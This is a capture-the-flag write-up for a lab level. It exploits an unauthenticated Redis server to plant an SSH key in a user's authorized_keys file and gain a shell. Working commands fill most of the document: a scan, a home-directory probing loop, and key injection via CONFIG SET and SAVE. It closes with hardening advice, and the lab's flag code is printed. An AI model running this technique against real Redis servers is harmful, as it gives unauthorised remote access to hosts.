# BreachLab - Phantom Track: Level 17 (Internal Hunt)

## General Information

- **Platform:** [BreachLab](https://breachlab.org)
- **Track:** Phantom Track (Post-Exploitation & Operational Tradecraft)
- **Level:** Level 17 (Internal Hunt)
- **Host:** `204.168.229.209`
- **Port:** `2223`
- **Current User:** `phantom17` (`10.13.37.2`)
- **Target Host:** `10.13.37.10` (`web-srv` / `phantom-web`)
- **Goal:** Scan the internal subnet (`10.13.37.0/24`), identify an unauthenticated Redis instance on `10.13.37.10:6379`, enumerate valid user homes, write an SSH public key to `/home/webadmin/.ssh/authorized_keys` via Redis database dumping (`CONFIG SET dir/dbfilename` + `SAVE`), obtain an interactive SSH shell, and capture the flag
- **Next User / Flag Code:** `bl_phtm17_91ec03fef953d01f`

---

## 1. Scenario & Objectives

Upon logging in via SSH, the MOTD banner and `BRIEFING` detail the mission parameters:

```
MISSION: Internal Hunt
====================

Scan the internal network (10.13.37.0/24).

One neighbour runs a service that shipped without authentication and
is happy to write to the local disk. Abuse that into a shell as the
service host user, then pick up the flag from their home.

Targets: 10.13.37.10, 10.13.37.20, 10.13.37.30.
```

The objective is to discover and exploit the unauthenticated network service running on an adjacent host in `10.13.37.0/24`, escalate from unauthenticated remote arbitrary file write to an interactive SSH shell, and harvest the target host's loot.

---

## 2. Reconnaissance & Service Enumeration (`10.13.37.10`)

Scanning the target `10.13.37.10` with Nmap:

```bash
phantom17@phantom:~$ nmap -Pn -sV -p22,6379 --script redis-info 10.13.37.10
Starting Nmap 7.80 ( https://nmap.org ) at 2026-07-22 01:39 UTC
Nmap scan report for phantom-web.breachlab-phantom_phantom-net (10.13.37.10)
Host is up (0.00025s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
6379/tcp open  redis   Redis key-value store 6.0.16 (64 bits)
| redis-info:
|   Version: 6.0.16
|   Role: master
|   Bind addresses:
|     0.0.0.0
```

- **Open Ports:** Port `22` (SSH) and Port `6379` (Redis 6.0.16).
- **Authentication Status:** Redis is bound to `0.0.0.0` with no password (`requirepass` disabled), allowing unrestricted execution of administrative commands.

---

## 3. Enumerating User Accounts & Writable Directories

Using `redis-cli` to probe directory accessibility and fuzz user home paths:

```bash
phantom17@phantom:~$ users=(
  redis redis-server www www-data nginx apache
  web webapp webuser webadmin webmaster
  app ubuntu admin phantom
)

for user in "${users[@]}"; do
    home="/home/$user"
    result=$(redis-cli -h 10.13.37.10 CONFIG SET dir "$home" 2>&1)
    if [[ "$result" == "OK" ]]; then
        echo "[+] HOME EXISTENTE: $home"
        ssh_result=$(redis-cli -h 10.13.37.10 CONFIG SET dir "$home/.ssh" 2>&1)
        if [[ "$ssh_result" == "OK" ]]; then
            echo "[!!!] SSH UTILIZABLE: $home/.ssh"
        fi
    fi
done
```

**Output:**
```
[+] HOME EXISTENTE: /home/webadmin
[!!!] SSH UTILIZABLE: /home/webadmin/.ssh
```

- Target account `/home/webadmin/.ssh` exists and is writable by the Redis process UID.

---

## 4. Exploitation: Arbitrary File Write via Redis DB Dump

### Step 1: Generating Local SSH Keypair

```bash
phantom17@phantom:~$ KEY="$HOME/.ssh/phantom17_ed25519"
phantom17@phantom:~$ ssh-keygen -t ed25519 -f "$KEY" -N '' -C 'phantom17-breachlab'
phantom17@phantom:~$ chmod 600 "$KEY"
```

### Step 2: Injecting Key Payload with Padding into Redis Memory

Padding the public key with newlines ensures OpenSSH can cleanly parse the key line amid binary RDB header/trailer chunks:

```bash
phantom17@phantom:~$ {
    printf '\n\n'
    cat "$KEY.pub"
    printf '\n\n'
} | redis-cli -h 10.13.37.10 -x SET phantom17_key
OK
```

### Step 3: Directing RDB Dump to `/home/webadmin/.ssh/authorized_keys`

```bash
phantom17@phantom:~$ redis-cli -h 10.13.37.10 CONFIG SET dir "/home/webadmin/.ssh"
OK
phantom17@phantom:~$ redis-cli -h 10.13.37.10 CONFIG SET dbfilename authorized_keys
OK
phantom17@phantom:~$ redis-cli -h 10.13.37.10 SAVE
OK
```

---

## 5. Lateral Movement & Flag Extraction

Logging into `webadmin@10.13.37.10` via SSH using the planted public key:

```bash
phantom17@phantom:~$ ssh -i "$KEY" webadmin@10.13.37.10
webadmin@web-srv:~$ ls
authorized_keys  id_ops  loot  test.txt  test_write.txt

webadmin@web-srv:~$ cat ~/loot/internal_scan.txt
bl_phtm17_91ec03fef953d01f
```

- **Extracted Flag:** `bl_phtm17_91ec03fef953d01f`

---

## 6. Flag / Credentials Retrieved

| Parameter | Value |
| :--- | :--- |
| **Track** | Phantom Track (Level 17) |
| **Current User** | `phantom17` (`10.13.37.2`) |
| **Target Host** | `10.13.37.10` (`webadmin@web-srv`) |
| **Vulnerable Service** | Unauthenticated Redis 6.0.16 (`TCP/6379`) |
| **Attack Vector** | Redis Arbitrary File Write via RDB Snapshotting (`CONFIG SET dir/dbfilename` + `SAVE`) |
| **Compromised Account** | `webadmin` |
| **Discovered Flag** | `bl_phtm17_91ec03fef953d01f` |

---

## 7. Key Commands & Concepts Reference

- `redis-cli -h <IP> CONFIG GET <param>`: Retrieve active Redis configuration options.
- `redis-cli -h <IP> CONFIG SET dir <path>`: Set working directory for database snapshots.
- `redis-cli -h <IP> CONFIG SET dbfilename <filename>`: Specify filename for saved database dump.
- `redis-cli -h <IP> SAVE`: Synchronously dump in-memory keyspace to disk.

---

## 8. Lessons Learned & Defensive Takeaways

1. **Unauthenticated Redis is Remote Code Execution:** Exposing Redis to any accessible interface without `requirepass` and with `CONFIG` enabled allows arbitrary filesystem writes, easily escalating to RCE via SSH keys, crontabs, or webshells.
2. **Rename or Disable Dangerous Redis Commands:** Redis configurations should disable or randomize dangerous administrative commands:
   ```
   rename-command CONFIG ""
   rename-command SAVE ""
   rename-command BGSAVE ""
   rename-command FLUSHALL ""
   ```
3. **Enforce Least Privilege & Directory Permissions:** Restrict the Redis daemon account so it cannot write to user home directories or `/etc/cron*`.
